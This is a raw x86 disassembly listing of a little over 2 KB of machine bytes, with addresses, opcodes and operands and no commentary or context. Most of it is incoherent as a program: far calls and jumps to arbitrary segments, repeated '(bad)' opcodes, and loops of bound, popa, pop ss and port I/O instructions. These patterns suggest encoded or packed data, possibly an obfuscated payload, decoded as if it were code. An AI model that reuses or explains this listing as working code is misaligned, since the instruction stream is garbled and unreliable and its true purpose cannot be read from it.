  432e88:	jmp    0xb23a:0x3b8ca155
  432e8f:	imul   ecx,DWORD PTR ds:0xa2ff9275,0xfffffff7
  432e96:	sbb    BYTE PTR ds:0xa2ff8675,cl
  432e9c:	push   esi
  432e9d:	dec    ecx
  432e9e:	or     eax,0xa2ff8675
  432ea3:	neg    DWORD PTR [eax]
  432ea5:	or     eax,0x61ff9275
  432eaa:	adc    al,0x57
  432eac:	and    al,BYTE PTR [esi+0x640da561]
  432eb2:	(bad)  
  432eb3:	add    DWORD PTR fs:[ecx+0x61],esp
  432eb7:	popa   
  432eb8:	or     eax,0xb857e75
  432ebd:	call   0xa8e8:0x5e343ac9
  432ec4:	popa   
  432ec5:	pop    ss
  432ec6:	jne    0x432f31
  432ec8:	adc    al,0x7a
  432eca:	int3   
  432ecb:	popa   
  432ecc:	popa   
  432ecd:	xchg   esp,eax
  432ece:	pop    ss
  432ecf:	jne    0x432f29
  432ed1:	adc    al,0x34
  432ed3:	int3   
  432ed4:	popa   
  432ed5:	popa   
  432ed6:	xchg   esp,eax
  432ed7:	pop    ss
  432ed8:	jne    0x432f20
  432eda:	adc    al,0xe3
  432edc:	int3   
  432edd:	popa   
  432ede:	popa   
  432edf:	xchg   esp,eax
  432ee0:	pop    ss
  432ee1:	jne    0x432f0b
  432ee3:	adc    al,0xaa
  432ee5:	int3   
  432ee6:	popa   
  432ee7:	popa   
  432ee8:	xchg   esp,eax
  432ee9:	pop    ss
  432eea:	jne    0x432f12
  432eec:	adc    al,0xc4
  432eee:	int3   
  432eef:	popa   
  432ef0:	popa   
  432ef1:	xchg   esp,eax
  432ef2:	pop    ss
  432ef3:	jne    0x432f45
  432ef5:	adc    al,0xa3
  432ef7:	int3   
  432ef8:	popa   
  432ef9:	popa   
  432efa:	xchg   esp,eax
  432efb:	pop    ss
  432efc:	jne    0x432f3c
  432efe:	adc    al,0xe8
  432f00:	int3   
  432f01:	popa   
  432f02:	popa   
  432f03:	xchg   esp,eax
  432f04:	pop    ss
  432f05:	jne    0x432f43
  432f07:	adc    al,0x96
  432f09:	int3   
  432f0a:	popa   
  432f0b:	popa   
  432f0c:	xchg   esp,eax
  432f0d:	pop    ss
  432f0e:	jne    0x432f52
  432f10:	adc    al,0xe6
  432f12:	int3   
  432f13:	popa   
  432f14:	popa   
  432f15:	xchg   esp,eax
  432f16:	pop    ss
  432f17:	jne    0x432f61
  432f19:	adc    al,0x9d
  432f1b:	int3   
  432f1c:	popa   
  432f1d:	popa   
  432f1e:	xchg   esp,eax
  432f1f:	pop    ss
  432f20:	jne    0x432f58
  432f22:	adc    al,0x34
  432f24:	int3   
  432f25:	popa   
  432f26:	popa   
  432f27:	xchg   esp,eax
  432f28:	pop    ss
  432f29:	jne    0x432f43
  432f2b:	adc    al,0xa8
  432f2d:	int3   
  432f2e:	popa   
  432f2f:	popa   
  432f30:	xchg   esp,eax
  432f31:	pop    ss
  432f32:	jne    0x432f4a
  432f34:	adc    al,0xcc
  432f36:	inc    ebp
  432f37:	popa   
  432f38:	popa   
  432f39:	xchg   esp,eax
  432f3a:	pop    ss
  432f3b:	jne    0x432f30
  432f3d:	adc    al,0xd3
  432f3f:	es popa 
  432f41:	popa   
  432f42:	xchg   esp,eax
  432f43:	pop    ss
  432f44:	jne    0x432f37
  432f46:	adc    al,0xdc
  432f48:	dec    eax
  432f49:	popa   
  432f4a:	popa   
  432f4b:	xchg   esp,eax
  432f4c:	pop    ss
  432f4d:	jne    0x432fb3
  432f4f:	adc    al,0xdf
  432f51:	xor    DWORD PTR [ecx+0x61],esp
  432f54:	xchg   esp,eax
  432f55:	pop    ss
  432f56:	jne    0x432f45
  432f58:	adc    al,0xa3
  432f5a:	int3   
  432f5b:	popa   
  432f5c:	popa   
  432f5d:	xchg   esp,eax
  432f5e:	pop    ss
  432f5f:	jne    0x432f92
  432f61:	or     eax,0xb858a75
  432f66:	call   0xd68a:0xcd0d3ac9
  432f6d:	outs   dx,DWORD PTR ds:[esi]
  432f6e:	or     ebx,DWORD PTR [edx+0x6e133ac9]
  432f74:	call   0xcd0d:0x61ce1b4b
  432f7b:	mov    dl,dh
  432f7d:	outs   dx,DWORD PTR ds:[esi]
  432f7e:	or     ebx,DWORD PTR [edx+0x6e133ac9]
  432f84:	call   0xcd0d:0x61a8e85e
  432f8b:	mov    dl,dh
  432f8d:	outs   dx,DWORD PTR ds:[esi]
  432f8e:	or     ebx,DWORD PTR [edx+0x6e133ac9]
  432f94:	call   0x7517:0x61a8e85e
  432f9b:	fisttp DWORD PTR ds:0xb857e75
  432fa1:	call   0xa8e8:0x5e343ac9
  432fa8:	popa   
  432fa9:	or     eax,0x6fd67ecd
  432fae:	or     ebx,DWORD PTR [edx+0x6e173ac9]
  432fb4:	adc    ebp,ebx
  432fb6:	dec    ebp
  432fb7:	push   edi
  432fb8:	popa   
  432fb9:	or     eax,0x610dfb75
  432fbe:	or     eax,0x6fd68acd
  432fc3:	or     ebx,DWORD PTR [edx-0x5df2c537]
  432fc9:	rcl    BYTE PTR [edi],cl
  432fcb:	outs   dx,BYTE PTR ds:[esi]
  432fcc:	adc    ebp,ebx
  432fce:	dec    ebp
  432fcf:	push   edi
  432fd0:	popa   
  432fd1:	or     eax,0xb858e75
  432fd6:	call   0xa8e8:0x5e343ac9
  432fdd:	popa   
  432fde:	or     eax,0x6fd68acd
  432fe3:	or     ebx,DWORD PTR [edx-0x5af2c537]
  432fe9:	mov    dl,dh
  432feb:	or     bx,WORD PTR [edx+0x10133ac9]
  432ff2:	mov    DWORD PTR [ebx+0x1b],ecx
  432ff5:	into   
  432ff6:	popa   
  432ff7:	pop    ss
  432ff8:	sub    al,0x13
  432ffa:	outs   dx,BYTE PTR ds:[esi]
  432ffb:	or     eax,0xb853875
  433000:	call   0xa8e8:0x5e343ac9
  433007:	popa   
  433008:	or     eax,0x6fd68acd
  43300d:	or     ebx,DWORD PTR [edx-0x5af2c537]
  433013:	mov    dl,dh
  433015:	or     bx,WORD PTR [edx+0x10133ac9]
  43301c:	mov    DWORD PTR [ebx+0x1b],ecx
  43301f:	into   
  433020:	popa   
  433021:	or     eax,0x66d68aa5
  433026:	or     ebx,DWORD PTR [edx+0x10133ac9]
  43302c:	mov    DWORD PTR [esi-0x18],ebx
  43302f:	test   al,0x61
  433031:	pop    ss
  433032:	sub    al,0x13
  433034:	outs   dx,BYTE PTR ds:[esi]
  433035:	adc    esi,DWORD PTR [ebp-0x25]
  433038:	ror    BYTE PTR ds:0xb858a75,cl
  43303e:	call   0xa8e8:0x5e343ac9
  433045:	popa   
  433046:	ror    BYTE PTR ds:0xbb349e75,cl
  43304c:	popa   
  43304d:	popa   
  43304e:	popa   
  43304f:	ror    BYTE PTR ds:0xdb0d9e75,cl
  433055:	cmc    
  433056:	push   0x72626161
  43305b:	bound  esp,QWORD PTR [ebp-0x2532f28e]
  433061:	pop    ss
  433062:	push   0xda2750d
  433067:	int    0xaa
  433069:	or     eax,0xd9a1791
  43306e:	jne    0x433006
  433070:	or     eax,0x910ddacd
  433075:	pop    ss
  433076:	call   0x9a0b:0x858a750d
  43307d:	leave  
  43307e:	cmp    cl,BYTE PTR ds:0x6fd68acd
  433084:	or     ebx,DWORD PTR [edx+0x6e133ac9]
  43308a:	call   0xcd0d:0x61ce1b4b
  433091:	mov    dl,dh
  433093:	outs   dx,DWORD PTR ds:[esi]
  433094:	or     ebx,DWORD PTR [edx+0x6e133ac9]
  43309a:	call   0xcd0d:0x61a8e85e
  4330a1:	mov    dl,dh
  4330a3:	outs   dx,DWORD PTR ds:[esi]
  4330a4:	or     ebx,DWORD PTR [edx+0x6e133ac9]
  4330aa:	call   0x7517:0x61a8e85e
  4330b1:	fisttp DWORD PTR ds:0x610dda75
  4330b7:	or     eax,0x6fd67ecd
  4330bc:	or     ebx,DWORD PTR [edx+0x6e173ac9]
  4330c2:	adc    ebp,ebx
  4330c4:	dec    ebp
  4330c5:	push   edi
  4330c6:	popa   
  4330c7:	or     eax,0x610dfb75
  4330cc:	or     eax,0x6fd68acd
  4330d1:	or     ebx,DWORD PTR [edx-0x5df2c537]
  4330d7:	rcl    BYTE PTR [edi],cl
  4330d9:	outs   dx,BYTE PTR ds:[esi]
  4330da:	adc    ebp,ebx
  4330dc:	dec    ebp
  4330dd:	push   edi
  4330de:	popa   
  4330df:	or     eax,0xb85a675
  4330e4:	call   0xa8e8:0x5e343ac9
  4330eb:	popa   
  4330ec:	or     eax,0x6fd68acd
  4330f1:	or     ebx,DWORD PTR [edx-0x5af2c537]
  4330f7:	mov    dl,dh
  4330f9:	or     bx,WORD PTR [edx+0x10133ac9]
  433100:	mov    DWORD PTR [ebx+0x1b],ecx
  433103:	into   
  433104:	popa   
  433105:	pop    ss
  433106:	sub    al,0x13
  433108:	outs   dx,BYTE PTR ds:[esi]
  433109:	or     eax,0xb858a75
  43310e:	call   0xd68a:0xcd0d3ac9
  433115:	outs   dx,DWORD PTR ds:[esi]
  433116:	or     ebx,DWORD PTR [edx+0x6e133ac9]
  43311c:	call   0xcd0d:0x61ce1b4b
  433123:	mov    dl,dh
  433125:	outs   dx,DWORD PTR ds:[esi]
  433126:	or     ebx,DWORD PTR [edx+0x6e133ac9]
  43312c:	call   0xcd13:0x61a8e85e
  433133:	imul   edx,DWORD PTR [edi],0x136ee2c6
  433139:	jne    0x433116
  43313b:	ror    BYTE PTR ds:0xb858a75,cl
  433141:	call   0xa8e8:0x5e343ac9
  433148:	popa   
  433149:	ror    BYTE PTR ds:0xed349e75,cl
  43314f:	popa   
  433150:	popa   
  433151:	popa   
  433152:	ror    BYTE PTR ds:0xdb0d9e75,cl
  433158:	cmc    
  433159:	push   0x72626161
  43315e:	bound  esp,QWORD PTR [ebp-0x18e31d8e]
  433164:	(bad)  
  433165:	or     eax,0xb857e75
  43316a:	call   0xa8e8:0x5e343ac9
  433171:	popa   
  433172:	pop    ss
  433173:	loop   0x433158
  433175:	bound  esp,QWORD PTR [edx+0x62]
  433178:	out    dx,al
  433179:	xchg   DWORD PTR ds:0xb858a75,ecx
  43317f:	call   0x62e3:0x130d3ac9
  433186:	bound  esp,QWORD PTR [edx+0x13]
  433189:	outs   dx,BYTE PTR ds:[esi]
  43318a:	push   0x61a8e85e
  43318f:	pop    ss
  433190:	loop   0x433175
  433192:	bound  esp,QWORD PTR [edx+0x62]
  433195:	or     eax,0x610dfb75
  43319a:	or     eax,0x6262e313
  43319f:	bound  esp,QWORD PTR [edi-0x788c2d26]
  4331a5:	or     eax,0x610dda75
  4331aa:	or     eax,0x13562ccd
  4331af:	jecxz  0x433213
  4331b1:	bound  esp,QWORD PTR [edx+0xd]
  4331b4:	in     al,0xe3
  4331b6:	bound  esp,QWORD PTR [edx+0x62]
  4331b9:	sbb    dl,BYTE PTR [ecx-0x116d79fc]
  4331bf:	sub    cl,BYTE PTR ds:0x610dda75
  4331c5:	or     eax,0x910ddacd
  4331ca:	push   esi
  4331cb:	cdq    
  4331cc:	xchg   esi,eax
  4331cd:	or     eax,0x6817fbcd
  4331d2:	or     eax,0x610dda75
  4331d7:	or     eax,0x910dfbcd
  4331dc:	push   esi
  4331dd:	(bad)  
  4331de:	std    
  4331df:	popa   
  4331e0:	popa   
  4331e1:	popa   
  4331e2:	pop    ss
  4331e3:	loop   0x4331c4
  4331e5:	bound  esp,QWORD PTR [edx+0x62]
  4331e8:	or     eax,0x610dda75
  4331ed:	or     eax,0x1f2d2ccd
  4331f2:	or     eax,0x681776cd
  4331f7:	or     eax,0x610dda75
  4331fc:	or     eax,0x910dfbcd
  433201:	push   esi
  433202:	cdq    
  433203:	cmp    BYTE PTR [edi],dl
  433205:	jne    0x433264
  433207:	or     eax,0xb857e75
  43320c:	call   0xa8e8:0x5e343ac9
  433213:	popa   
  433214:	pop    ss
  433215:	jne    0x43326c
  433217:	or     eax,0x6262dfe2
  43321c:	bound  ecx,QWORD PTR ds:0xe217f7a2
  433222:	out    0x62,eax
  433224:	bound  esp,QWORD PTR [edx-0x12]
  433227:	xchg   ebx,eax
  433228:	or     eax,0x6262dfe2
  43322d:	bound  ecx,QWORD PTR ds:0xe217f7a2
  433233:	out    0x62,eax
  433235:	bound  esp,QWORD PTR [edx+0xd]
  433238:	jne    0x4332b8
  43323a:	test   DWORD PTR [ebx],ecx
  43323c:	call   0xa8e8:0x5e343ac9
  433243:	popa   
  433244:	mov    eax,ds:0x6262e7e2
  433249:	bound  edx,QWORD PTR [ebx+0x6168726e]
  43324f:	popa   
  433250:	or     eax,0xb857e75
  433255:	call   0xa8e8:0x5e343ac9
  43325c:	popa   
  43325d:	pop    ss
  43325e:	loop   0x43324b
  433260:	bound  esp,QWORD PTR [edx+0x62]
  433263:	out    dx,al
  433264:	lea    ecx,ds:0x6262ebe2
  43326a:	bound  esp,QWORD PTR [edx+0x62ebe217]
  433270:	bound  esp,QWORD PTR [edx+0xd]
  433273:	loop   0x43325c
  433275:	bound  esp,QWORD PTR [edx+0x62]
  433278:	fdiv   st,st(3)
  43327a:	call   0x62eb:0xe2a1f34f
  433281:	bound  esp,QWORD PTR [edx-0x6d]
  433284:	fsub   DWORD PTR [edx]
  433286:	popa   
  433287:	popa   
  433288:	popa   
  433289:	or     eax,0x6262ebe2
  43328e:	bound  ecx,QWORD PTR ds:0x6262df13
  433294:	bound  edx,QWORD PTR [ebx-0x6566d30e]
  43329a:	or     eax,0x6fd68acd
  43329f:	or     ebx,DWORD PTR [edx+0x1fd63ac9]
  4332a5:	pop    esi
  4332a6:	call   0x3f629453
  4332ab:	xchg   BYTE PTR ds:0x66d68aa5,cl
  4332b1:	or     ebx,DWORD PTR [edx+0x22d63ac9]
  4332b7:	pop    esi
  4332b8:	call   0x4e709465
  4332bd:	jg     0x4332de
  4332bf:	pop    ss
  4332c0:	loop   0x43333c
  4332c2:	bound  esp,QWORD PTR [edx+0x62]
  4332c5:	or     eax,0x6262ebe2
  4332ca:	bound  ecx,QWORD PTR ds:0x6262df13
  4332d0:	bound  edx,QWORD PTR [ebx-0x6566d30e]
  4332d6:	pop    ds
  4332d7:	imul   eax,DWORD PTR [esi+0x62e6e217],0xe20d6262
  4332e1:	out    0x62,al
  4332e3:	bound  esp,QWORD PTR [edx+0x33]
  4332e6:	pop    esi
  4332e7:	call   0xbc89494
  4332ec:	call   0x1e2:0x239d3ac9
  4332f3:	imul   esp,edi,0x6270f03a
  4332f9:	bound  esp,QWORD PTR [edx-0x12]
  4332fc:	ror    DWORD PTR ds:0x610dda75,1
  433302:	or     eax,0x6262df13
  433307:	bound  ecx,QWORD PTR ds:0x7a135691
  43330d:	bound  esp,QWORD PTR [edx+0x62]
  433310:	fcom   DWORD PTR [esi+0x72e7619a]
  433316:	or     eax,0x610dda75
  43331b:	or     eax,0x6262df13
  433320:	bound  ecx,QWORD PTR ds:0x7a135691
  433326:	bound  esp,QWORD PTR [edx+0x62]
  433329:	push   esi
  43332a:	pop    ds
  43332b:	pop    ss
  43332c:	loop   0x4332fc
  43332e:	bound  esp,QWORD PTR [edx+0x62]
  433331:	or     eax,0x610d7675
  433336:	or     eax,0x6262ce13
  43333b:	bound  edx,QWORD PTR [esi+0x68]
  43333e:	or     eax,0x6262ce13
  433343:	bound  edx,QWORD PTR [edi]
  433345:	push   0x626280f0
  43334a:	bound  ecx,QWORD PTR ds:0xe2565575
  433350:	out    0x62,eax
  433352:	bound  esp,QWORD PTR [edx+0x17]
  433355:	jne    0x4333ac
  433357:	or     eax,0xcd0d5575
  43335c:	sti    
  43335d:	or     eax,0x54d6a791
  433362:	popa   
  433363:	popa   
  433364:	popa   
  433365:	call   0xdcf21c9
  43336a:	loop   0x43334b
  43336c:	bound  esp,QWORD PTR [edx+0x62]
  43336f:	push   esi
  433370:	loop   0x433359
  433372:	bound  esp,QWORD PTR [edx+0x62]
  433375:	pop    ss
  433376:	loop   0x433357
  433378:	bound  esp,QWORD PTR [edx+0x62]
  43337b:	lock and al,0x63
  43337e:	bound  esp,QWORD PTR [edx+0xd]
  433381:	jne    0x43330d
  433383:	test   DWORD PTR [ebx],ecx
  433385:	call   0xd68a:0xcd0d3ac9
  43338c:	outs   dx,DWORD PTR ds:[esi]
  43338d:	or     ebx,DWORD PTR [edx+0x6e133ac9]
  433393:	call   0xcd0d:0x61ce1b4b
  43339a:	mov    dl,dh
  43339c:	outs   dx,DWORD PTR ds:[esi]
  43339d:	or     ebx,DWORD PTR [edx+0x6e133ac9]
  4333a3:	call   0xcd0d:0x61a8e85e
  4333aa:	mov    dl,dh
  4333ac:	outs   dx,DWORD PTR ds:[esi]
  4333ad:	or     ebx,DWORD PTR [edx+0x6e133ac9]
  4333b3:	call   0x7517:0x61a8e85e
  4333ba:	fisttp DWORD PTR ds:0xcd0d2c75
  4333c0:	jle    0x433398
  4333c2:	outs   dx,DWORD PTR ds:[esi]
  4333c3:	or     ebx,DWORD PTR [edx+0x6e173ac9]
  4333c9:	adc    ebp,ebx
  4333cb:	dec    ebp
  4333cc:	push   edi
  4333cd:	popa   
  4333ce:	or     eax,0x610dfb75
  4333d3:	or     eax,0x6fd68acd
  4333d8:	or     ebx,DWORD PTR [edx-0x5df2c537]
  4333de:	rcl    BYTE PTR [edi],cl
  4333e0:	outs   dx,BYTE PTR ds:[esi]
  4333e1:	adc    ebp,ebx
  4333e3:	dec    ebp
  4333e4:	push   edi
  4333e5:	popa   
  4333e6:	or     eax,0xb85a675
  4333eb:	call   0xa8e8:0x5e343ac9
  4333f2:	popa   
  4333f3:	or     eax,0x6fd68acd
  4333f8:	or     ebx,DWORD PTR [edx-0x5af2c537]
  4333fe:	mov    dl,dh
  433400:	or     bx,WORD PTR [edx+0x10133ac9]
  433407:	mov    DWORD PTR [ebx+0x1b],ecx
  43340a:	into   
  43340b:	popa   
  43340c:	pop    ss
  43340d:	sub    al,0x13
  43340f:	outs   dx,BYTE PTR ds:[esi]
  433410:	or     eax,0xb858a75
  433415:	call   0xd68a:0xcd0d3ac9
  43341c:	outs   dx,DWORD PTR ds:[esi]
  43341d:	or     ebx,DWORD PTR [edx+0x6e133ac9]
  433423:	call   0xcd0d:0x61ce1b4b
  43342a:	mov    dl,dh
  43342c:	outs   dx,DWORD PTR ds:[esi]
  43342d:	or     ebx,DWORD PTR [edx+0x6e133ac9]
  433433:	call   0xcd13:0x61a8e85e
  43343a:	imul   edx,DWORD PTR [edi],0x136ee2c6
  433440:	jne    0x43341d
  433442:	ror    BYTE PTR ds:0xb858a75,cl
  433448:	call   0xa8e8:0x5e343ac9
  43344f:	popa   
  433450:	ror    BYTE PTR ds:0xed349e75,cl
  433456:	popa   
  433457:	popa   
  433458:	popa   
  433459:	ror    BYTE PTR ds:0xdb0d9e75,cl
  43345f:	cmc    
  433460:	push   0x72626161
  433465:	bound  esp,QWORD PTR [ebp-0x618af28e]
  43346b:	or     eax,0x6168dbdb
  433470:	popa   
  433471:	pop    ss
  433472:	jne    0x4334c0
  433474:	or     eax,0x610d7675
  433479:	push   esi
  43347a:	jne    0x4334c8
  43347c:	pop    ss
  43347d:	jne    0x4334cb
  43347f:	or     eax,0xcd0d4c75
  433484:	jbe    0x433493
  433486:	xchg   ecx,eax
  433487:	pop    ss
  433488:	call   0x2c22:0x575d750d
  43348f:	popa   
  433490:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  433491:	or     eax,0x13c9c964
  433496:	jne    0x4334ed
  433498:	pop    ss
  433499:	jne    0x433504
  43349b:	or     eax,0x61216975
  4334a0:	push   edx
  4334a1:	sub    dl,dh
  4334a3:	imul   edx,esi,0x2a5255ea
  4334a9:	(bad)  
  4334aa:	imul   esi,DWORD PTR [edx-0x6d8af274],0xe090a2ff
  4334b4:	or     eax,0xa2ff8675
  4334b9:	call   0xa2ff:0x86750d60
  4334c0:	nop
  4334c1:	loopne 0x4334d0
  4334c3:	jne    0x433457
  4334c5:	jmp    DWORD PTR [edx+0x22571b5f]
  4334cb:	xchg   BYTE PTR [ecx-0x5b],ah
  4334ce:	or     eax,0x750dc964
  4334d3:	jbe    0x4334e2
  4334d5:	fisttp DWORD PTR [eax+ebp*2]
  4334d8:	popa   
  4334d9:	popa   
  4334da:	or     eax,0x55751761
  4334df:	or     eax,0xb859a75
  4334e4:	call   0xa8e8:0x5e343ac9
  4334eb:	popa   
  4334ec:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4334ed:	jne    0x433481
  4334ef:	mov    dl,0x7e
  4334f1:	clc    
  4334f2:	pushf  
  4334f3:	xchg   BYTE PTR [edx-0x11a872aa],dh
  4334f9:	mov    edi,0x869cf698
  4334fe:	mov    dl,0x56
  433500:	lock out dx,eax
  433502:	popa   
  433503:	popa   
  433504:	popa   
  433505:	or     eax,0x610d7e75
  43350a:	or     eax,0x6fd69acd
  43350f:	or     ebx,DWORD PTR [edx+0x1fd63ac9]
  433515:	pop    esi
  433516:	call   0x1fea96c3
  43351b:	out    0x80,eax
  43351d:	bound  esi,QWORD PTR [edx-0x754d9d8a]
  433523:	bound  esi,QWORD PTR [edx+0x7e750d55]
  433529:	bound  esi,QWORD PTR [edx-0xd]
  43352c:	test   eax,0xd626265
  433531:	int    0x7e
  433533:	pop    ss
  433534:	push   0x750dceee
  433539:	call   0x343a:0xc99a0b85
  433540:	pop    esi
  433541:	call   0xcd5096ee
  433546:	xchg   dh,dl
  433548:	outs   dx,DWORD PTR ds:[esi]
  433549:	or     ebx,DWORD PTR [edx+0x1fd63ac9]
  43354f:	pop    esi
  433550:	call   0x1fea96fd
  433555:	mov    dl,0x88
  433557:	clc    
  433558:	inc    edi
  433559:	xor    ecx,esi
  43355b:	fsubr  st(5),st
  43355d:	sbb    al,0xed
  43355f:	push   ebp
  433560:	imul   ecx,DWORD PTR [ecx],0xfffffff6
  433563:	inc    edi
  433564:	xor    ecx,esi
  433566:	fsub   st(6),st
  433568:	test   al,0xd
  43356a:	jne    0x433506
  43356c:	test   DWORD PTR [ebx],ecx
  43356e:	call   0xa8e8:0x5e343ac9
  433575:	popa   
  433576:	mov    eax,ds:0x89e75575
  43357b:	clc    
  43357c:	mov    eax,ds:0x3393b57c
  433581:	and    ecx,esi
  433583:	(bad)  
  433584:	jmp    0x43357c
  433586:	mov    eax,ds:0xee93b57c
  43358b:	xchg   ebx,eax
  43358c:	clc    
  43358d:	inc    edi
  43358e:	addr16 lahf 
  433590:	scas   eax,DWORD PTR es:[edi]
  433591:	aad    0x9c
  433593:	fs xchg ebp,eax
  433595:	enter  0x47f6,0x67
  433599:	lahf   
  43359a:	scas   eax,DWORD PTR es:[edi]
  43359b:	push   edi
  43359c:	and    cl,BYTE PTR [edx+0x640da561]
  4335a2:	fsub   DWORD PTR [esi+eax*4+0xd]
  4335a6:	jne    0x433542
  4335a8:	test   DWORD PTR [ebx],ecx
  4335aa:	call   0xa8e8:0x5e343ac9
  4335b1:	popa   
  4335b2:	or     eax,0x681792cd
  4335b7:	or     eax,0xdb0d8a75
  4335bc:	jmp    0xda49729
  4335c1:	int    0x8a
  4335c3:	or     eax,0x6168e917
  4335c8:	popa   
  4335c9:	or     eax,0x56610d91
  4335ce:	cdq    
  4335cf:	xchg   esi,eax
  4335d0:	pop    ss
  4335d1:	jne    0x433630
  4335d3:	or     eax,0xdb0d8a75
  4335d8:	dec    eax
  4335d9:	push   0xa20d6161
  4335de:	jle    0x4335f7
  4335e0:	jne    0x43364b
  4335e2:	jo     0x4335db
  4335e4:	jp     0x433647
  4335e6:	jb     0x433649
  4335e8:	popa   
  4335e9:	or     eax,0xeb625d75
  4335ee:	shl    BYTE PTR [eax+0x61],cl
  4335f1:	bound  esp,QWORD PTR [ebp+0x7ecd0d69]
  4335f7:	pop    ss
  4335f8:	push   0x859a750d
  4335fd:	or     ebx,DWORD PTR [edx+0x5e343ac9]
  433603:	call   0x755a97b0
  433608:	push   ebp
  433609:	bound  esi,QWORD PTR [edx+0x5575138a]
  43360f:	shl    BYTE PTR [edx-0x4e],cl
  433612:	jle    0x433676
  433614:	mov    dl,0x92
  433616:	bound  esi,QWORD PTR [edx-0x654d9d7a]
  43361c:	repz mov cl,0x63
  43361f:	bound  esp,QWORD PTR [edx+0xd]
  433622:	jne    0x4336a2
  433624:	or     eax,0x9acd0d61
  433629:	(bad)  
  43362a:	outs   dx,DWORD PTR ds:[esi]
  43362b:	or     ebx,DWORD PTR [edx+0x1fd63ac9]
  433631:	pop    esi
  433632:	call   0x1fea97df
  433637:	out    0x6a,eax
  433639:	or     eax,0xb858675
  43363e:	call   0xa8e8:0x5e343ac9
  433645:	popa   
  433646:	xchg   ebx,eax
  433647:	mov    edx,0xcd0d5575
  43364c:	xchg   edx,eax
  43364d:	pop    ss
  43364e:	push   0x617e2257
  433653:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  433654:	or     eax,0x9264d864
  433659:	and    DWORD PTR [ebp+0x5d],esi
  43365c:	lods   eax,DWORD PTR ds:[esi]
  43365d:	loop   0x433660
  43365f:	imul   esp,DWORD PTR [ecx],0xe2253175
  433665:	add    DWORD PTR [ecx+0xd],ebp
  433668:	jne    0x4336c7
  43366a:	test   DWORD PTR [ebx],ecx
  43366c:	call   0xa8e8:0x5e343ac9
  433673:	popa   
  433674:	pop    ss
  433675:	jne    0x4336cc
  433677:	or     eax,0x75178675
  43367c:	imul   edi,DWORD PTR [edx-0x53],0x626901e2
  433683:	mov    dl,0x69
  433685:	bound  esi,QWORD PTR [edx+0x5575139a]
  43368b:	shl    BYTE PTR [edx-0x4e],cl
  43368e:	imul   esp,DWORD PTR [edx-0x4e],0x5db26231
  433695:	repz fbld TBYTE PTR [ecx+0x61]
  433699:	popa   
  43369a:	pop    ss
  43369b:	jne    0x4336f2
  43369d:	or     eax,0x22575575
  4336a2:	xchg   BYTE PTR [ecx-0x5b],ah
  4336a5:	or     eax,0x92b26264
  4336aa:	bound  esi,QWORD PTR [edx-0x685e857a]
  4336b0:	mov    ah,0x69
  4336b2:	repz out 0x6f,eax
  4336b5:	bound  esp,QWORD PTR [edx+0xd]
  4336b8:	jne    0x433640
  4336ba:	jmp    DWORD PTR [ecx+0x50]
  4336bd:	bound  esi,QWORD PTR [edx-0x794d9d6e]
  4336c3:	jp     0x43370e
  4336c5:	pop    edx
  4336c6:	loop   0x433731
  4336c8:	repz pop edx
  4336ca:	dec    edx
  4336cb:	bound  esp,QWORD PTR [edx+0xd]
  4336ce:	jne    0x433656
  4336d0:	jmp    DWORD PTR [edx-0x4d9d9bcc]
  4336d6:	xchg   edx,eax
  4336d7:	bound  esi,QWORD PTR [edx-0x11aa857a]
  4336dd:	loop   0x433748
  4336df:	repz pop es
  4336e1:	push   0x750d6161
  4336e6:	xchg   bh,bh
  4336e8:	mov    ds:0xb262f33b,al
  4336ed:	xchg   edx,eax
  4336ee:	bound  esi,QWORD PTR [edx-0x59b8857a]
  4336f4:	mov    ah,0x69
  4336f6:	repz retf 
  4336f8:	and    DWORD PTR [edx+0x62],esp
  4336fb:	or     eax,0xa2ff8675
  433700:	pop    edi
  433701:	sbb    esp,DWORD PTR [edx-0x4e]
  433704:	xchg   edx,eax
  433705:	bound  esi,QWORD PTR [edx-0x119f857a]
  43370b:	sar    BYTE PTR [edx],cl
  43370d:	repz fstp QWORD PTR [edx+eiz*2+0x62]
  433712:	mov    ebp,0xa5618622
  433717:	or     eax,0xfbead664
  43371c:	lods   eax,DWORD PTR ds:[esi]
  43371d:	loop   0x433720
  43371f:	imul   esi,DWORD PTR [edx-0x1dda852c],0xb2626901
  433729:	jbe    0x43378d
  43372b:	mov    dl,0x8a
  43372d:	bound  esi,QWORD PTR [edx-0x6d4d9d82]
  433733:	bound  esi,QWORD PTR [edx-0x654d9d7a]
  433739:	repz push eax
  43373b:	bound  esp,QWORD PTR [edx+0x62]
  43373e:	or     eax,0x68177ecd
  433743:	lock test eax,0xd6616168
  433749:	jmp    0xb269:0x1e225fb
  433750:	aam    0x7a
  433752:	mov    bl,0xe2
  433754:	add    DWORD PTR [ecx+0x62],ebp
  433757:	mov    dl,0x76
  433759:	bound  esi,QWORD PTR [edx+0x7eb2628a]
  43375f:	bound  esi,QWORD PTR [edx-0x794d9d6e]
  433765:	bound  esi,QWORD PTR [edx+0x62b0f39a]
  43376b:	bound  esp,QWORD PTR [edx+0xd]
  43376e:	int    0x7e
  433770:	pop    ss
  433771:	push   0x61685ff0
  433776:	popa   
  433777:	(bad)  
  433778:	jmp    0xb269:0x1e2b3fb
  43377f:	aam    0x7a
  433781:	and    esp,edx
  433783:	add    DWORD PTR [ecx+0x62],ebp
  433786:	mov    dl,0x76
  433788:	bound  esi,QWORD PTR [edx+0x7eb2628a]
  43378e:	bound  esi,QWORD PTR [edx-0x794d9d6e]
  433794:	bound  esi,QWORD PTR [edx+0x62e1f39a]
  43379a:	bound  esp,QWORD PTR [edx+0xd]
  43379d:	int    0x7e
  43379f:	pop    ss
  4337a0:	push   0x616145f0
  4337a5:	popa   
  4337a6:	(bad)  
  4337a7:	jmp    0xb269:0x1e223fb
  4337ae:	aam    0x7a
  4337b0:	and    dl,ah
  4337b2:	add    DWORD PTR [ecx+0x62],ebp
  4337b5:	mov    dl,0x76
  4337b7:	bound  esi,QWORD PTR [edx+0x7eb2628a]
  4337bd:	bound  esi,QWORD PTR [edx-0x794d9d6e]
  4337c3:	bound  esi,QWORD PTR [edx+0x62d7f39a]
  4337c9:	bound  esp,QWORD PTR [edx+0xd]
  4337cc:	int    0x7e
  4337ce:	pop    ss
  4337cf:	push   0x616154f0
  4337d4:	popa   
  4337d5:	(bad)  
  4337d6:	jmp    0xb269:0x1e227fb
  4337dd:	and    DWORD PTR [edx-0x4e],0x7eb26292
  4337e4:	bound  esi,QWORD PTR [edx-0x794d9d76]
  4337ea:	bound  esi,QWORD PTR [edx+0x5cacf39a]
